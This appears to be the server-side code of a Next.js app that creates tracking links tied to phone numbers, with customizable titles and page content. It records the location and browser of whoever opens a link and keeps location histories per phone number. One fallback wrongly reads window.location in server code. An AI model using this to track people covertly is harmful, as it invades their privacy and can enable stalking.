"use server"

import { revalidatePath } from "next/cache"
import crypto from "crypto"
import { sql } from "./db"
import { getUser } from "./simple-auth"
import { seedAdminUserAlternative } from "./seed-admin"
import { migrateDatabase } from "./migrate-db"

// Ensure admin user exists and run migrations
try {
  seedAdminUserAlternative()
  migrateDatabase() // Run database migrations
} catch (error) {
  console.error("Error initializing application:", error)
}

/**
 * Generates a tracking link for the given phone number
 */
export async function generateTrackingLink(options: {
  phoneNumber: string
  customSlug?: string
  customTitle?: string
  customDescription?: string
  customContent?: string
}): Promise<string> {
  try {
    const { phoneNumber, customSlug, customTitle, customDescription, customContent } = options

    // Generate a unique ID for this tracking request or use the custom slug
    const id =
      customSlug && customSlug.trim() !== ""
        ? customSlug.trim().toLowerCase().replace(/\s+/g, "-")
        : crypto.randomBytes(8).toString("hex")

    // Check if the slug already exists
    if (customSlug && customSlug.trim() !== "") {
      const existingSlug = await sql`SELECT id FROM tracking_links WHERE id = ${id}`
      if (existingSlug && existingSlug.length > 0) {
        throw new Error("This slug is already in use. Please choose a different one.")
      }
    }

    // Get the current user
    const user = getUser()
    const username = user?.username || "system"

    // Try to insert with the new columns, but handle the case where they might not exist yet
    try {
      // First try with the new columns
      await sql`
        INSERT INTO tracking_links 
        (id, phone_number, created_by, custom_title, custom_description, custom_content) 
        VALUES 
        (${id}, ${phoneNumber}, ${username}, ${customTitle || null}, ${customDescription || null}, ${customContent || null})
      `
    } catch (error) {
      // If that fails, try the original schema
      console.error("Error inserting with new columns, falling back to original schema:", error)
      await sql`
        INSERT INTO tracking_links 
        (id, phone_number, created_by) 
        VALUES 
        (${id}, ${phoneNumber}, ${username})
      `

      // Try to run the migration again
      await migrateDatabase()
    }

    // Generate the full URL
    const baseUrl = process.env.NEXT_PUBLIC_APP_URL || "http://localhost:3000"
    return `${baseUrl}/track/${id}?phone=${encodeURIComponent(phoneNumber)}`
  } catch (error) {
    console.error("Error generating tracking link:", error)
    throw error
  }
}

/**
 * Gets tracking link details by ID
 */
export async function getTrackingLinkById(trackingId: string) {
  try {
    const result = await sql`
      SELECT * FROM tracking_links WHERE id = ${trackingId}
    `
    return result.length > 0 ? result[0] : null
  } catch (error) {
    console.error("Error getting tracking link:", error)
    return null
  }
}

/**
 * Saves location data when a tracking link is clicked
 */
export async function saveLocationData(
  trackingId: string,
  latitude: number,
  longitude: number,
  browser: string,
): Promise<void> {
  try {
    // Get the phone number from the tracking link record
    const trackingLinkResult = await sql`
      SELECT phone_number FROM tracking_links WHERE id = ${trackingId}
    `

    // Use the phone number from the tracking link or fallback to query param
    let phoneNumber = "unknown"

    if (trackingLinkResult && trackingLinkResult.length > 0) {
      phoneNumber = trackingLinkResult[0].phone_number
    } else {
      // Fallback to URL query parameter if needed
      try {
        const url = new URL(window.location.href)
        const queryPhone = url.searchParams.get("phone")
        if (queryPhone) {
          phoneNumber = queryPhone
        }
      } catch (e) {
        console.error("Error parsing URL:", e)
      }
    }

    // Save the location data to the database
    await sql`
      INSERT INTO location_data (tracking_id, phone_number, latitude, longitude, browser) 
      VALUES (${trackingId}, ${phoneNumber}, ${latitude}, ${longitude}, ${browser})
    `

    // Revalidate the profile page to show updated data
    revalidatePath(`/profile/${phoneNumber}`)
    revalidatePath(`/dashboard`)
  } catch (error) {
    console.error("Error saving location data:", error)
    throw new Error("Failed to save location data")
  }
}

/**
 * Gets location history for a specific phone number
 */
export async function getLocationHistory(phoneNumber: string) {
  try {
    const results = await sql`
      SELECT * FROM location_data 
      WHERE phone_number = ${phoneNumber} 
      ORDER BY timestamp DESC
    `
    return results
  } catch (error) {
    console.error("Error getting location history:", error)
    return []
  }
}

/**
 * Gets recent locations from all devices
 */
export async function getRecentLocations(limit = 10) {
  try {
    const results = await sql`
      SELECT * FROM location_data 
      ORDER BY timestamp DESC 
      LIMIT ${limit}
    `
    return results
  } catch (error) {
    console.error("Error getting recent locations:", error)
    return []
  }
}

/**
 * Gets tracking statistics
 */
export async function getTrackingStats() {
  try {
    // Get total tracking links
    const totalLinksResult = await sql`SELECT COUNT(*) as count FROM tracking_links`
    const totalLinks = Number.parseInt(totalLinksResult[0]?.count || "0")

    // Get total locations
    const totalLocationsResult = await sql`SELECT COUNT(*) as count FROM location_data`
    const totalLocations = Number.parseInt(totalLocationsResult[0]?.count || "0")

    // Get unique phone numbers
    const uniquePhonesResult = await sql`SELECT COUNT(DISTINCT phone_number) as count FROM location_data`
    const uniquePhones = Number.parseInt(uniquePhonesResult[0]?.count || "0")

    // Get recent activity (last 7 days)
    const recentActivityResult = await sql`
      SELECT 
        DATE(timestamp) as date, 
        COUNT(*) as count 
      FROM location_data 
      WHERE timestamp >= NOW() - INTERVAL '7 days' 
      GROUP BY DATE(timestamp) 
      ORDER BY date DESC
    `

    return {
      totalLinks,
      totalLocations,
      uniquePhones,
      recentActivity: recentActivityResult.map((row) => ({
        date: row.date ? row.date.toISOString().split("T")[0] : new Date().toISOString().split("T")[0],
        count: Number.parseInt(row.count || "0"),
      })),
    }
  } catch (error) {
    console.error("Error getting tracking stats:", error)
    return {
      totalLinks: 0,
      totalLocations: 0,
      uniquePhones: 0,
      recentActivity: [],
    }
  }
}

// Add a new function to delete location data
export async function deleteLocationData(locationId: number): Promise<boolean> {
  try {
    // Get the phone number first for revalidation
    const locationResult = await sql`
      SELECT phone_number FROM location_data WHERE id = ${locationId}
    `

    const phoneNumber = locationResult?.[0]?.phone_number || "unknown"

    // Delete the location data
    await sql`DELETE FROM location_data WHERE id = ${locationId}`

    // Revalidate the profile page and dashboard
    revalidatePath(`/profile/${phoneNumber}`)
    revalidatePath(`/dashboard`)

    return true
  } catch (error) {
    console.error("Error deleting location data:", error)
    return false
  }
}

// Add a new function to delete tracking link
export async function deleteTrackingLink(trackingId: string): Promise<boolean> {
  try {
    // Get the phone number first for revalidation
    const linkResult = await sql`
      SELECT phone_number FROM tracking_links WHERE id = ${trackingId}
    `

    const phoneNumber = linkResult?.[0]?.phone_number || "unknown"

    // Delete associated location data first
    await sql`DELETE FROM location_data WHERE tracking_id = ${trackingId}`

    // Then delete the tracking link
    await sql`DELETE FROM tracking_links WHERE id = ${trackingId}`

    // Revalidate paths
    revalidatePath(`/profile/${phoneNumber}`)
    revalidatePath(`/dashboard`)

    return true
  } catch (error) {
    console.error("Error deleting tracking link:", error)
    return false
  }
}

// Add a function to get all tracking links
export async function getAllTrackingLinks() {
  try {
    // First check if the new columns exist
    const checkColumnResult = await sql`
      SELECT column_name 
      FROM information_schema.columns 
      WHERE table_name = 'tracking_links' AND column_name = 'custom_title'
    `

    let results

    if (checkColumnResult.length > 0) {
      // If the new columns exist, include them in the query
      results = await sql`
        SELECT tl.*, 
               COUNT(ld.id) as location_count,
               MAX(ld.timestamp) as last_used
        FROM tracking_links tl
        LEFT JOIN location_data ld ON tl.id = ld.tracking_id
        GROUP BY tl.id, tl.phone_number, tl.created_by, tl.created_at, tl.custom_title, tl.custom_description, tl.custom_content
        ORDER BY tl.created_at DESC
      `
    } else {
      // Otherwise, use the original schema
      results = await sql`
        SELECT tl.*, 
               COUNT(ld.id) as location_count,
               MAX(ld.timestamp) as last_used
        FROM tracking_links tl
        LEFT JOIN location_data ld ON tl.id = ld.tracking_id
        GROUP BY tl.id, tl.phone_number, tl.created_by, tl.created_at
        ORDER BY tl.created_at DESC
      `
    }

    return results
  } catch (error) {
    console.error("Error getting tracking links:", error)
    return []
  }
}
